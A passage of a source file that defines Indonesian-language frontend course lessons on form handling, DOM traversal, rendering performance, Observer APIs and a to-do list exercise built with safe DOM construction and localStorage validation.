        'Pesan error harus **berada di dekat fieldnya** dan terhubung lewat `aria-describedby`; fokus harus **berpindah ke field pertama yang gagal**; dan tombol submit harus **dinonaktifkan selama pengiriman** supaya tidak terkirim dua kali.',
      ),

      h2('Validasi klien bukan pengaman'),
      code(
        'js',
        `
        // Semua ini bisa dilewati dalam sepuluh detik lewat DevTools:
        //   - menghapus atribut required
        //   - mengubah maxlength
        //   - memanggil endpoint langsung dengan curl, tanpa membuka halaman sama sekali
        //
        // Validasi di klien adalah soal PENGALAMAN: umpan balik cepat, tanpa
        // menunggu jaringan. Kontrol keamanannya SELALU di server.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Pasang `submit` pada `<form>`, bukan pada tombolnya.',
        '`FormData` hanya membaca input yang punya `name`.',
        'Validasi bawaan HTML sudah membawa pesan yang diterjemahkan — pakai sebelum menulis sendiri.',
        'Error di dekat fieldnya, terhubung `aria-describedby`, dan fokus ke yang pertama gagal.',
        'Validasi klien adalah UX; kontrol keamanannya di server.',
      ),
    ],
  ),

  written(
    'traversal-dom',
    'Menelusuri DOM',
    9,
    'Bergerak dari satu elemen ke tetangganya, induknya, atau anaknya.',
    [
      h2('Element vs Node'),
      code(
        'js',
        `
        // Versi 'Element' mengabaikan text node — hampir selalu yang kamu mau
        el.parentElement;              vs   el.parentNode;
        el.children;                   vs   el.childNodes;
        el.firstElementChild;          vs   el.firstChild;
        el.nextElementSibling;         vs   el.nextSibling;
        el.previousElementSibling;     vs   el.previousSibling;
        `,
      ),
      callout(
        'warning',
        '`firstChild` sering bukan yang kamu kira',
        'Pada HTML yang diindentasi, `firstChild` biasanya adalah **text node berisi spasi dan baris baru**, bukan elemen pertama. Pakai `firstElementChild`.',
      ),

      h2('`closest` — naik sampai ketemu'),
      code(
        'js',
        `
        // Dari titik klik, naik sampai menemukan yang cocok (termasuk dirinya sendiri)
        e.target.closest('[data-id]');
        e.target.closest('li');
        e.target.closest('form');

        // null kalau tidak ada sampai akar dokumen
        `,
      ),
      p(
        '`closest` adalah pasangan wajib event delegation, dan salah satu method DOM yang paling sering terpakai.',
      ),

      h2('Memeriksa hubungan'),
      code(
        'js',
        `
        wadah.contains(el);              // true kalau el di dalam wadah (atau el === wadah)
        el.matches('.aktif');            // true kalau el cocok dengan selector

        // Pola "klik di luar" — untuk menutup dropdown
        document.addEventListener('click', (e) => {
          if (!dropdown.contains(e.target)) tutup();
        });
        `,
      ),

      h2('Mencari ke bawah'),
      code(
        'js',
        `
        kartu.querySelector('.judul');       // pertama di dalam kartu
        kartu.querySelectorAll('button');    // semua di dalam kartu

        [...daftar.children];                // anak langsung saja
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Pakai versi `*Element*` — ia mengabaikan text node dari indentasi.',
        '`closest` naik sampai menemukan yang cocok; pasangan wajib event delegation.',
        '`contains` untuk memeriksa "apakah di dalam"; `matches` untuk "apakah cocok".',
        'Pola klik-di-luar dibangun dari `contains`, bukan dari `stopPropagation`.',
      ),
    ],
  ),

  written(
    'performa-dom',
    'Performa: reflow, repaint, batching',
    13,
    'Kenapa manipulasi DOM bisa membuat halaman terasa berat — dan cara mengukurnya.',
    [
      h2('Tiga langkah render'),
      table(
        ['Langkah', 'Artinya', 'Biaya'],
        [
          ['**Layout / reflow**', 'Menghitung ulang posisi dan ukuran', 'Paling mahal'],
          ['**Paint**', 'Menggambar piksel', 'Sedang'],
          ['**Composite**', 'Menyusun lapisan', 'Murah — bisa di GPU'],
        ],
      ),
      code(
        'js',
        `
        el.style.width = '200px';       // reflow + paint + composite
        el.style.color = 'red';         // paint + composite
        el.style.transform = 'translateX(10px)';   // composite saja
        el.style.opacity = '0.5';                  // composite saja
        `,
      ),
      callout(
        'tip',
        'Kenapa animasi selalu memakai `transform` dan `opacity`',
        'Keduanya hanya memicu tahap composite, yang berjalan di GPU dan tidak menyentuh layout. Menganimasikan `width`, `top`, atau `margin` memicu reflow **setiap frame** — itulah beda animasi mulus dan animasi tersendat.',
      ),

      h2('Layout thrashing'),
      code(
        'js',
        `
        // LAMBAT: membaca dan menulis bergantian
        for (const el of elemen) {
          el.style.height = el.offsetHeight + 10 + 'px';
        }
        // offsetHeight memaksa browser MENYELESAIKAN layout yang tertunda.
        // Karena ada penulisan sebelumnya, layout dihitung ulang tiap iterasi.
        `,
      ),
      code(
        'js',
        `
        // CEPAT: baca semua dulu, baru tulis semua
        const tinggi = elemen.map((el) => el.offsetHeight);   // fase baca
        elemen.forEach((el, i) => {
          el.style.height = tinggi[i] + 10 + 'px';            // fase tulis
        });
        `,
      ),
      p(
        'Property yang memicu layout paksa: `offsetTop/Left/Width/Height`, `clientWidth/Height`, `scrollTop/Height`, `getBoundingClientRect()`, dan `getComputedStyle()`.',
      ),

      h2('`requestAnimationFrame`'),
      code(
        'js',
        `
        // SALAH: menyentuh DOM setiap kali event scroll terpicu (bisa ratusan kali/detik)
        window.addEventListener('scroll', () => {
          bar.style.width = hitungPersen() + '%';
        });

        // BENAR: paling banyak sekali per frame
        let terjadwal = false;

        window.addEventListener('scroll', () => {
          if (terjadwal) return;
          terjadwal = true;

          requestAnimationFrame(() => {
            bar.style.width = hitungPersen() + '%';
            terjadwal = false;
          });
        }, { passive: true });
        `,
      ),

      h2('Ukur, jangan menebak'),
      ol(
        'Buka **Performance** di DevTools, rekam interaksi yang terasa lambat.',
        'Cari blok kuning (**Scripting**) dan ungu (**Rendering**) yang panjang.',
        'Segitiga merah di sudut task menandakan **long task** — apa pun di atas 50 ms memblokir interaksi.',
        'Klik untuk melihat fungsi mana penyebabnya. Perbaiki yang itu, bukan yang kamu duga.',
      ),
      callout(
        'warning',
        'Optimasi tanpa pengukuran hampir selalu salah sasaran',
        'Kode yang "terlihat lambat" sering bukan penyebabnya. `code-style.md` menyebut ini terang-terangan: jangan mengorbankan kejelasan demi optimasi mikro tanpa bukti pengukuran.',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Reflow (layout) paling mahal; `transform` dan `opacity` hanya memicu composite.',
        'Membaca property layout memaksa perhitungan — jangan diselang-seling dengan penulisan.',
        'Kumpulkan semua pembacaan dulu, baru semua penulisan.',
        '`requestAnimationFrame` membatasi pembaruan ke satu kali per frame.',
        'Ukur dengan Performance panel sebelum mengubah apa pun.',
      ),
    ],
  ),

  written(
    'observer-api',
    'Observer API',
    12,
    'Bereaksi terhadap perubahan tanpa polling dan tanpa listener scroll.',
    [
      p(
        'Tiga API bawaan yang memberi tahu saat sesuatu berubah — jauh lebih murah daripada memeriksa terus-menerus.',
      ),

      h2('`IntersectionObserver` — saat elemen masuk layar'),
      code(
        'js',
        `
        const pengamat = new IntersectionObserver(
          (entries) => {
            for (const entry of entries) {
              if (!entry.isIntersecting) continue;

              const img = entry.target;
              img.src = img.dataset.src;      // baru muat sekarang
              pengamat.unobserve(img);        // sekali saja
            }
          },
          {
            rootMargin: '200px',   // mulai memuat 200px SEBELUM terlihat
            threshold: 0,
          },
        );

        document.querySelectorAll('img[data-src]').forEach((img) => pengamat.observe(img));
        `,
      ),
      callout(
        'tip',
        'Pemakaian lain yang sering',
        'Infinite scroll (amati elemen sentinel di bawah daftar), penanda bagian aktif pada daftar isi, dan menghentikan video saat keluar layar. Website ini memakainya untuk menandai bagian aktif di daftar isi halaman materi.',
      ),

      h2('`ResizeObserver` — saat ukuran elemen berubah'),
      code(
        'js',
        `
        const pengamatUkuran = new ResizeObserver((entries) => {
          for (const entry of entries) {
            const { width } = entry.contentRect;
            entry.target.classList.toggle('sempit', width < 400);
          }
        });

        pengamatUkuran.observe(kartu);
        `,
      ),
      p(
        'Bedanya dengan `window.resize`: ia memantau **elemennya**, bukan jendela. Elemen bisa berubah ukuran karena sidebar terbuka, font termuat, atau isinya bertambah — tanpa jendela berubah sama sekali.',
      ),

      h2('`MutationObserver` — saat DOM berubah'),
      code(
        'js',
        `
        const pengamatDom = new MutationObserver((mutasi) => {
          for (const m of mutasi) {
            if (m.type === 'childList') console.log('anak berubah', m.addedNodes);
            if (m.type === 'attributes') console.log('atribut', m.attributeName);
          }
        });

        pengamatDom.observe(wadah, {
          childList: true,
          attributes: true,
          subtree: true,
        });
        `,
      ),
      callout(
        'warning',
        '`MutationObserver` adalah pilihan terakhir',
        'Kalau kamu yang mengubah DOM-nya, kamu sudah tahu kapan itu terjadi — panggil saja fungsinya langsung. Ia benar-benar diperlukan hanya saat mengamati DOM yang diubah kode di luar kendalimu.',
      ),

      h2('Selalu putuskan pengamatan'),
      code(
        'js',
        `
        pengamat.unobserve(el);   // berhenti mengamati satu elemen
        pengamat.disconnect();    // berhenti sepenuhnya

        // Di React:
        useEffect(() => {
          const o = new IntersectionObserver(cb);
          o.observe(ref.current);
          return () => o.disconnect();     // WAJIB
        }, []);
        `,
      ),

      h2('Kenapa ini mengalahkan listener `scroll`'),
      table(
        ['', 'Listener `scroll`', '`IntersectionObserver`'],
        [
          ['Frekuensi', 'Ratusan kali per detik', 'Hanya saat melintasi ambang'],
          ['Butuh baca layout', 'Ya (`getBoundingClientRect`)', 'Tidak'],
          ['Berjalan di main thread', 'Ya', 'Sebagian di luar'],
          ['Kode', 'Manual, perlu throttle', 'Deklaratif'],
        ],
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`IntersectionObserver` untuk lazy load, infinite scroll, dan penanda bagian aktif.',
        '`ResizeObserver` memantau elemen, bukan jendela.',
        '`MutationObserver` hanya untuk DOM yang diubah kode di luar kendalimu.',
        'Selalu `disconnect()` saat selesai — kalau tidak, memori tertahan.',
        'Observer jauh lebih murah daripada listener `scroll` yang membaca layout.',
      ),
    ],
  ),

  written(
    'praktik-todo-dom',
    'Praktik: To-Do List versi DOM penuh',
    16,
    'Menyambungkan modul logika Bab 1 ke tampilan nyata — tanpa menyentuh logikanya sama sekali.',
    [
      p(
        'Di Bab 1 kamu menulis `todo.js` yang tidak tahu-menahu soal layar. Sekarang kamu memberinya tampilan. Modul logikanya **tidak diubah satu baris pun** — itulah bukti bahwa pemisahannya benar.',
      ),

      h2('1. Struktur HTML'),
      code(
        'html',
        `
        <main>
          <h1>Daftar Tugas</h1>

          <form id="form-tugas">
            <label for="judul" class="sr-only">Tugas baru</label>
            <input id="judul" name="judul" required autocomplete="off"
                   placeholder="Apa yang ingin kamu kerjakan?" />
            <button type="submit">Tambah</button>
          </form>

          <p id="error" role="alert"></p>

          <div role="group" aria-label="Saring tugas">
            <button type="button" data-filter="semua" aria-pressed="true">Semua</button>
            <button type="button" data-filter="aktif" aria-pressed="false">Aktif</button>
            <button type="button" data-filter="selesai" aria-pressed="false">Selesai</button>
          </div>

          <ul id="daftar"></ul>
          <p id="ringkasan" aria-live="polite"></p>
        </main>
        `,
      ),

      h2('2. Render dari data, bukan menulis HTML manual'),
      code(
        'js',
        `
        import { buatTugas, tambah, hapus, toggleSelesai, saring, ringkasan, FILTER }
          from './todo.js';

        const el = {
          form: document.querySelector('#form-tugas'),
          input: document.querySelector('#judul'),
          error: document.querySelector('#error'),
          daftar: document.querySelector('#daftar'),
          ringkasan: document.querySelector('#ringkasan'),
        };

        let daftar = muatDariPenyimpanan();
        let filter = FILTER.SEMUA;

        function render() {
          const terlihat = saring(daftar, filter);
          el.daftar.replaceChildren();

          if (terlihat.length === 0) {
            const kosong = document.createElement('li');
            kosong.className = 'kosong';
            kosong.textContent =
              daftar.length === 0
                ? 'Belum ada tugas. Tambahkan yang pertama di atas.'
                : 'Tidak ada tugas yang cocok dengan saringan ini.';
            el.daftar.append(kosong);
          } else {
            const fragment = document.createDocumentFragment();
            for (const t of terlihat) fragment.append(buatBaris(t));
            el.daftar.append(fragment);
          }

          const r = ringkasan(daftar);
          el.ringkasan.textContent = \`\${r.selesai} dari \${r.total} selesai (\${r.persen}%)\`;
          simpanKePenyimpanan(daftar);
        }
        `,
      ),
      callout(
        'info',
        'Dua keadaan kosong yang berbeda',
        '"Belum ada tugas sama sekali" dan "ada tugas, tapi tidak ada yang cocok dengan saringan" adalah situasi berbeda dan butuh kalimat berbeda. Menyamakannya membuat pengguna mengira datanya hilang.',
      ),

      h2('3. Membuat baris — tanpa `innerHTML`'),
      code(
        'js',
        `
        function buatBaris(tugas) {
          const li = document.createElement('li');
          li.dataset.id = tugas.id;
          li.classList.toggle('selesai', tugas.selesai);

          const centang = document.createElement('input');
          centang.type = 'checkbox';
          centang.checked = tugas.selesai;
          centang.dataset.aksi = 'toggle';
          centang.id = \`t-\${tugas.id}\`;

          const label = document.createElement('label');
          label.htmlFor = centang.id;
          label.textContent = tugas.judul;      // AMAN untuk teks apa pun

          const hapusBtn = document.createElement('button');
          hapusBtn.type = 'button';
          hapusBtn.dataset.aksi = 'hapus';
          hapusBtn.textContent = 'Hapus';
          hapusBtn.setAttribute('aria-label', \`Hapus tugas: \${tugas.judul}\`);

          li.append(centang, label, hapusBtn);
          return li;
        }
        `,
      ),

      h2('4. Satu listener untuk seluruh daftar'),
      code(
        'js',
        `
        el.daftar.addEventListener('click', (e) => {
          const kontrol = e.target.closest('[data-aksi]');
          if (!kontrol) return;

          const id = kontrol.closest('[data-id]').dataset.id;

          if (kontrol.dataset.aksi === 'toggle') daftar = toggleSelesai(daftar, id);
          if (kontrol.dataset.aksi === 'hapus')  daftar = hapus(daftar, id);

          render();
        });
        `,
      ),

      h2('5. Form dengan penanganan error'),
      code(
        'js',
        `
        el.form.addEventListener('submit', (e) => {
          e.preventDefault();
          el.error.textContent = '';

          try {
            daftar = tambah(daftar, buatTugas(el.input.value));
            el.input.value = '';
            el.input.focus();          // siap mengetik berikutnya
            render();
          } catch (error) {
            // Error dari modul logika, bukan dari sini — itu memang tempatnya
            el.error.textContent = error.message;
            el.input.setAttribute('aria-invalid', 'true');
          }
        });
        `,
      ),

      h2('6. Filter dengan status yang terbaca teknologi bantu'),
      code(
        'js',
        `
        document.querySelector('[aria-label="Saring tugas"]')
          .addEventListener('click', (e) => {
            const tombol = e.target.closest('[data-filter]');
            if (!tombol) return;

            filter = tombol.dataset.filter;

            for (const b of e.currentTarget.querySelectorAll('[data-filter]')) {
              b.setAttribute('aria-pressed', String(b === tombol));
            }

            render();
          });
        `,
      ),

      h2('7. Menyimpan ke `localStorage`'),
      code(
        'js',
        `
        const KUNCI = 'todo.v1';

        function muatDariPenyimpanan() {
          try {
            const mentah = localStorage.getItem(KUNCI);
            if (!mentah) return [];

            const data = JSON.parse(mentah);
            if (!Array.isArray(data)) return [];   // data rusak — jangan dipercaya

            return data.filter(
              (t) => typeof t?.id === 'string' && typeof t?.judul === 'string',
            );
          } catch {
            return [];   // JSON rusak atau storage diblokir
          }
        }

        function simpanKePenyimpanan(data) {
          try {
            localStorage.setItem(KUNCI, JSON.stringify(data));
          } catch (error) {
            // Kuota penuh atau mode privat — beri tahu, jangan telan diam-diam
            el.error.textContent = 'Perubahan tidak bisa disimpan di browser ini.';
            console.error('[simpan]', error);
          }
        }
        `,
      ),
      callout(
        'warning',
        'Data dari `localStorage` adalah input yang tidak tepercaya',
        'Ia bisa diedit tangan lewat DevTools, tersisa dari versi aplikasi yang lama, atau rusak sebagian. Selalu validasi bentuknya setelah `JSON.parse` — persis seperti yang kamu lakukan pada respons API.',
      ),

      checklist(
        'frontend-basic/manipulasi-dom/praktik',
        'Checklist praktik 4.13',
        'Modul `todo.js` dari Bab 1 dipakai tanpa diubah satu baris pun',
        'Tidak ada satu pun `innerHTML` di seluruh berkas',
        'Hanya ada satu listener untuk seluruh daftar (event delegation)',
        'Dua keadaan kosong dibedakan: belum ada tugas vs tidak cocok saringan',
        'Judul kosong ditolak, pesannya muncul di `role="alert"`, fokus kembali ke input',
        'Data dari `localStorage` divalidasi bentuknya setelah `JSON.parse`',
        'Kegagalan menyimpan diberitahukan, bukan ditelan diam-diam',
        'Seluruh aplikasi bisa dipakai hanya dengan keyboard',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Logika yang terpisah bisa diberi tampilan tanpa diubah — itu buktinya benar.',
        'Render dari data; jangan pernah menulis HTML dengan menyambung string.',
        'Satu listener dengan delegation menangani baris yang belum dibuat.',
        'Bedakan keadaan kosong yang berbeda penyebabnya.',
        'Perlakukan `localStorage` sebagai input tidak tepercaya.',
        'Di Frontend Intermediate, React akan mengotomatiskan `render()` — dan sekarang kamu tahu persis apa yang diotomatiskan.',
      ),
    ],
  ),
];
